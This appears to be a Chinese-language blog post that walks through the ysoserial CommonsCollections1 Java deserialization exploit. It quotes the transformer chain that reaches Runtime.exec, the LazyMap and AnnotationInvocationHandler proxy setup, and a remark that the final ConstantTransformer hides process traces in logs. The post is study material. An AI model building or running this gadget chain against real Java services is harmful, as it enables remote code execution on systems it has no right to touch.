---
title: CommonsCollections1
date: 2026-10-01
updated: 2026-10-05
tags:
  - CommonsCollections1
  - Java
  - 反序列化漏洞
  - 不安全的反序列化
  - ysoserial
description: CommonsCollections1
---

## 利用链全览 & 依赖

```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
```

依赖：

- Apache Commons Collections 3.1 ~ 3.2.1
- JDK 主版本小于 8 或 JDK 8 且 update 小于等于 71（即 JDK 8u71）

## 环境准备

直接克隆 [ysoserial](https://github.com/frohoff/ysoserial) 仓库：

```bash
git clone https://github.com/frohoff/ysoserial.git
```

随后用 IDEA 打开该仓库。

Payload 所在的路径：`src/main/java/ysoserial/payloads/CommonsCollections1.java`

`pom.xml` 中准备的 Apache Commons Collections 的版本是 3.1：

```xml
<dependency>
	<groupId>commons-collections</groupId>
	<artifactId>commons-collections</artifactId>
	<version>3.1</version>
</dependency>
```

Maven 依赖仅会下载依赖对应的 `jar` 文件，并不会下载源码，而后续分析会涉及到源码，建议下载（否则只能看到 IDEA 反编译后的代码）：

在 IDEA 的右侧有 Maven 选项卡，打开后能看到所有的“依赖项”：

![[Pasted image 20261102035621.png|500]]

下载方式：选中要源码的依赖 → 下载源代码

## 讲解

### `LazyMap.get()`

先从 `LazyMap` 类的 `get` 方法看起：

```java hl:4
public Object get(Object key) {
	// create value for key if key is not currently in the map
	if (map.containsKey(key) == false) {
		Object value = factory.transform(key);
		map.put(key, value);
		return value;
	}
	return map.get(key);
}
```

如果 `map` 中的 `key` 尚未存在，则会执行：

```java
factory.transform(key)
```

其中，`factory` 是 `LazyMap` 中的一个属性，是一个实现了 Transformer 接口的类的实例：

```java
protected final Transformer factory;
```

```java hlt:interface
package org.apache.commons.collections;

public interface Transformer {

    public Object transform(Object input);

}
```

来看 Payload 中链的构造：

```java
// inert chain for setup
final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
		new ConstantTransformer(Runtime.class),
		new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
		new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
		new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
		new ConstantTransformer(1) };

[snip]
Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
[snip]
```

这里作者先设置了一个无害的链（为了防止在本地生成 Payload（即序列化）的时候就触发了利用链，从而对自己的电脑造成危害）：

```java
// inert chain for setup
final Transformer transformerChain = new ChainedTransformer(
	    new Transformer[]{ new ConstantTransformer(1) });
```

随后构造了真实有效的链：

```java
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
		new ConstantTransformer(Runtime.class),
		new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
		new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
		new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
		new ConstantTransformer(1) };
```

接着通过反射，找到 `transformerChain` 中的 `iTransformers` 属性，并将其赋值为 `transformers`（前面构造好的链条）：

```java
Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
```

```java
public static Field getField(final Class<?> clazz, final String fieldName) {
	Field field = null;
try {
	field = clazz.getDeclaredField(fieldName);
	setAccessible(field);
	}
	catch (NoSuchFieldException ex) {
		if (clazz.getSuperclass() != null)
			field = getField(clazz.getSuperclass(), fieldName);
	}
	return field;
}

public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
	final Field field = getField(obj.getClass(), fieldName);
	field.set(obj, value);
}	
```

来看 `ChainedTransformer` 中的 `transform` 方法：

```java
public Object transform(Object object) {
	for(int i = 0; i < this.iTransformers.length; ++i) {
		object = this.iTransformers[i].transform(object);
	}

	return object;
}
```

它会遍历 `iTransformers` 数组中的所有对象，并执行这些对象的 `transform` 方法。

而 `iTransformers` 被赋值成了那个真实有效的链条。

一条条看，首先是：

```java
new ConstantTransformer(Runtime.class),
```

其构造方法以及 `transform` 方法很简单，它会直接返回传入的参数对象：

```java
public ConstantTransformer(Object constantToReturn) {
	super();
	iConstant = constantToReturn;
}

public Object transform(Object input) {
	return iConstant;
}
```

此时得到的 `object` 为：

```java
Runtime.class
```

接着看下一条：

```java
new InvokerTransformer("getMethod", new Class[] {
        String.class, Class[].class }, new Object[] {
        "getRuntime", new Class[0] }),
```

其构造方法以及 `transform` 方法如下：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
	super();
	iMethodName = methodName;
	iParamTypes = paramTypes;
	iArgs = args;
}

public Object transform(Object input) {
	if (input == null) {
		return null;
	}
	try {
		Class cls = input.getClass();
		Method method = cls.getMethod(iMethodName, iParamTypes);
		return method.invoke(input, iArgs);
			
	} catch (NoSuchMethodException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
	} catch (IllegalAccessException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
	} catch (InvocationTargetException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
	}
}
```

此时的 `input` 是上一链得到的 `object`，接着通过反射机制，得到其 `getMethod` 方法，参数为 `getRuntime`。

因此，此时的 `object` 为：

```java
Runtime.class.getMethod("getRuntime", null)
```

下一条链非常类似，基本就只是换了方法名与参数：

```java
new InvokerTransformer("invoke", new Class[] {
		Object.class, Object[].class }, new Object[] {
		null, new Object[0] }),
```

因此过程不再赘述，此时的 `object` 为：

```java
Runtime.class.getMethod("getRuntime", null).invoke(null,null)
```

下一条链也是类似：

```java
new InvokerTransformer("exec",
		new Class[] { String.class }, execArgs),
```

此时的 `object`：

```java
Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec(execArgs)
```

这段代码就是通过反射机制实现的：

```java
Runtime.getRuntime().exec()
```

此时其实已经执行了攻击者所提供的命令，但作者还在后面安排了一个：

```java
new ConstantTransformer(1)
```

对 `object` 进行置 1 操作（作为最后的返回值）：

```java
public ConstantTransformer(Object constantToReturn) {
	this.iConstant = constantToReturn;
}

public Object transform(Object input) {
	return this.iConstant;
}
```

为什么要改返回值？（了解即可）

**不加**最后的 `ConstantTransformer(1)` 时，会抛：

```text
ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set
```
  
  日志里直接暴露出 `ProcessImpl`，特征很明显。

**加上**之后，返回的是 `Integer`，异常变成：

```text
ClassCastException: java.lang.Integer cannot be cast to java.util.Set
```

就看不出“启动了进程”这个痕迹。

所以它的主要目的是**降低异常日志的特征**（隐蔽性），不是功能上必需的。

### AnnotationInvocationHandler

接下来就是想着如何通过反序列化触发 `LazyMap.get()`：

```java
final Map innerMap = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
```

ysoserial 针对：

- 创建动态代理（设置 `AnnotationInvocationHandler` 为处理器）
- 实例化 `AnnotationInvocationHandler`

提供了两个语法糖写法，即代码中看到的：

- `Gadgets.createMemoitizedProxy`
- `Gadgets.createMemoizedInvocationHandler`

#### `createMemoitizedProxy`

先来看：

```java
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
```

```java
public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
	return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}


public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
	return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}


public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
	final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
	allIfaces[ 0 ] = iface;
	if ( ifaces.length > 0 ) {
		System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
	}
	return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}
```

`createMemoizedInvocationHandler(lazyMap)` 会调用 `AnnotationInvocationHandler` 的构造方法，并将其中的 `memberValues` 属性赋值为 `LazyMap`：

```java hl:8
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
	Class<?>[] superInterfaces = type.getInterfaces();
	if (!type.isAnnotation() ||
		superInterfaces.length != 1 ||
		superInterfaces[0] != java.lang.annotation.Annotation.class)
		throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
	this.type = type;
	this.memberValues = memberValues;
}
```

接着：

```java
createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
```

会创建一个动态代理，并由上述 `AnnotationInvocationHandler` 对象作为处理器。

这个动态代理对象会赋值给 `mapProxy`。

#### `createMemoizedInvocationHandler`

接下来：

```java
final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
```

这个方法上面讲过，这里不赘述。

得到的效果是，动态代理对象 `mapProxy` 作为 `AnnotationInvocationHandler` 构造方法的参数，使得属性 `memberValues` 被赋值为 `mapProxy`。

#### `readObject`

反序列化的时候，JVM 会通过反射机制去调用对象中的 `readObject`（如果有的话）。

`AnnotationInvocationHandler` 中是有该方法的：

```java hlt:streamVals.entrySet()
private void readObject(java.io.ObjectInputStream s)
	[snip]
	Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);
	[snip]
	for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
		[snip]
	}
	[snip]
}
```

其中的 `streamVals.entrySet()`，等价于：

```
memberValues.entrySet() → mapProxy.entrySet()
```

而 `mapProxy` 是一个动态代理对象，对其的方法调用，最终都会回归到其处理器的 `invoke()` 方法上：

```java
AnnotationInvocationHandler.invoke()
```

**注意**，此时已经来到第一个 `AnnotationInvocationHandler`，即此时的 `memberValues` 是 `LazyMap` 而不是 `mapProxy`。

```java hl:4
public Object invoke(Object proxy, Method method, Object[] args) {
	String member = method.getName();
	[snip]
	Object result = memberValues.get(member);
	[snip]
}
```

即会调用：

```
LazyMap.get(member)
```

这就成功了。

## 参考文章

- [CommonsCollections1 讲解类文章](https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-1)
- [AnnotationInvocationHandler 类的定义](https://github.com/JetBrains/jdk8u_jdk/blob/master/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)
- [ysoserial](https://github.com/frohoff/ysoserial)